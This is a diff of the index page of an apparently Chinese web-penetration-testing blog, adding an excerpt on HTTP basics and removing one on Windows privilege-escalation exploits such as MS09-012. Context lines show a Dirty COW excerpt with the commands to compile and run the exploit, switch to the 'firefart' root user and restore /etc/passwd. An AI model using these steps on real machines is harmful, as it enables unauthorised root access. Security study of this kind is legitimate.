@@ -139,6 +139,38 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/06/18/http-basic/">
+                从入侵者的眼中去理解 http 协议
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-06-18</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/http/">http</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;不管对于web开发亦或是渗透来讲,熟练掌握http协议的核心运作要点都是入门必备科目,如果连这些最基础的东西都没掌握熟练,又何谈下一步呢,因为http会贯穿于后续整个web渗透过程,当然啦,就http协议本身来讲,还是非常非常复杂的,单单靠一篇文章就想全面透彻的掌握http协议,毕竟不太现实,所以我们今天也只是模拟站在一个专业入侵者的角度上来重新理解http协议最核心的一些点,中间也会穿插着说明这些点容易带来的一些安全问题,如果大家真的非常有兴趣,想继续深入学习http协议,建议参考 《http权威指南》,着实是本http方面的好书,起码,个人是这样觉得的,既然是说协议,也就意味着某些东西可能会有些抽象,不过大家不用担心,我会用尽量用最容易理解的方式把它说明白,废话到此为止,咱们开始</p>
+<p>0x02 初始 http 简要工作过程<br>&nbsp;&nbsp;客户端向web服务器请求所指定的资源(request)  =&gt; web服务器(默认端口通常为80,8080)<br>&nbsp;&nbsp;web服务器响应给客户端所请求的对应的资源数据(response) =&gt; 客户端(随机端口和目标web服务端口进行连接)<br>&nbsp;&nbsp;简单来讲,http就是一套用来规定”请求(request)”和”响应(response)”的规范,以此来保证客户端和服务端能够正常的进行通信<br>&nbsp;&nbsp;用白话来讲 <font size="3" color="red">客户端向服务器端请求,然后服务器端把被请求的东西交给客户端</font> 这就算一次完整的http通信<br>
+        </div>
+        <a href="/2017/06/18/http-basic/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/05/20/web-pentest-options/">
                 web渗透基本流程小结 [ 边界1 ]
             </a>
@@ -583,38 +615,6 @@
             <p><br><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="string">'脏牛'</span>[Dirty copy-on-write] 提权小记:</div><div class="line">实际渗透中,提的成功率相对来讲还是蛮高的,屡试不爽,废话不多说,祝大家好运吧,至于漏洞细节,请自行参考公告,影响内核版本  Dirty COW.c  <span class="number">2.6</span>.<span class="number">22</span> &lt; <span class="number">3.9</span> </div><div class="line"></div><div class="line">$ gcc -pthread dirty.c -o dirty -lcrypt</div><div class="line">$ ./dirty admin</div><div class="line">$ su firefart</div><div class="line"><span class="comment"># mv /tmp/passwd.bak /etc/passwd	干完活,一定要记得把东西还原回来,exp已经有相应的msf模块可用,大家请自行尝试</span></div><div class="line"><span class="comment"># exit</span></div></pre></td></tr></table></figure></p>
         </div>
         <a href="/2017/04/22/dirty/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2017/04/22/win-0day-privilege/">
-                windows 溢出提权小记
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2017-04-22</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/exp/">exp</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br><br>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;平时用的相对比较多,就顺手自己记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/technet.microsoft.com/zh</span>-cn/library/security/dn639106.aspx</div></pre></td></tr></table></figure></p>
-<p>0x02 具体exp利用如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">RPCSS服务没有正确地隔离NetworkService或LocalService帐号下运行的进程,导致本地攻击者可以利用令牌劫持的方式获得权限提升</div><div class="line">漏洞代号: MS09-<span class="number">012</span></div><div class="line">补丁编号: KB952004</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 针对<span class="number">03</span>以下系统,菜刀可用</div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2017/04/22/win-0day-privilege/" class="read-more">Read More</a>
     
 
 </div>
